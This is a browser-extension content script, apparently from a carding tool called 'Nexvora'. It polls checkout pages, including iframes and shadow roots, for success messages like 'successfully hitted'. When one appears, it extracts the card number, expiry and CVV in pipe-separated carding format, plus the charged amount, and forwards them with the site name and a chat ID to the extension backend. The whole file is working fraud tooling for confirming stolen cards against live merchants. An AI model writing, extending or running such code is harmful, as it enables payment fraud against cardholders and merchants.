/**
 * Nexvora Absolute Detection (v9.0 - Instant)
 * Zero filter, zero delay, pure speed.
 */

(function() {
    let hasNotified = false;

    /** 500ms Lightning Scan */
    setInterval(() => {
        if (hasNotified) return;

        const scanRecursive = (root) => {
            if (hasNotified || !root) return;

            // 1. Evaluate individual elements (Atomic)
            const elements = root.querySelectorAll ? root.querySelectorAll('*') : [];
            for (let el of elements) {
                if (hasNotified) break;

                const text = el.innerText || el.textContent || '';
                const lower = text.toLowerCase();

                // High-Confidence Hit Check (Absolute)
                const isHit = (
                    lower.includes('paid successfully') || 
                    lower.includes('successfully hitted') || 
                    lower.includes('payment successful') ||
                    lower.includes('approved')
                );

                if (isHit && text.length > 5 && text.length < 500) {
                    hasNotified = true;
                    
                    // Instant extraction
                    const cardMatch = text.match(/\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}/);
                    const bodyText = document.body.innerText;
                    const currencyRegex = /(?:[A-Z]{2,3}|[\$£€¥])\s?[\d,]+(?:\.\d{2,3})?|[\d,]+(?:\.\d{2})\s?(?:[A-Z]{2,3}|[\$£€¥])/gi;
                    const amountMatch = text.match(currencyRegex) || bodyText.match(currencyRegex);

                    // Send to background proxy immediately
                    chrome.runtime.sendMessage({
                        type: 'NOTIFY_HIT',
                        data: {
                            card: cardMatch ? cardMatch[0] : 'N/A',
                            amount: amountMatch ? amountMatch[0].trim() : 'N/A',
                            gateway: 'Stripe Gateway',
                            status: 'Approved',
                            site_name: window.location.hostname,
                            user_chat_id: 'Unknown'
                        }
                    });
                    return;
                }
            }

            // 2. Child traversals (Iframe/Shadow)
            if (root.shadowRoot) scanRecursive(root.shadowRoot);
            const iframes = root.querySelectorAll ? root.querySelectorAll('iframe') : [];
            for (let iframe of iframes) {
                try {
                    if (iframe.contentDocument && iframe.contentDocument.body) {
                        scanRecursive(iframe.contentDocument.body);
                    }
                } catch (e) {}
            }
        };

        scanRecursive(document.body);
    }, 500);
})();
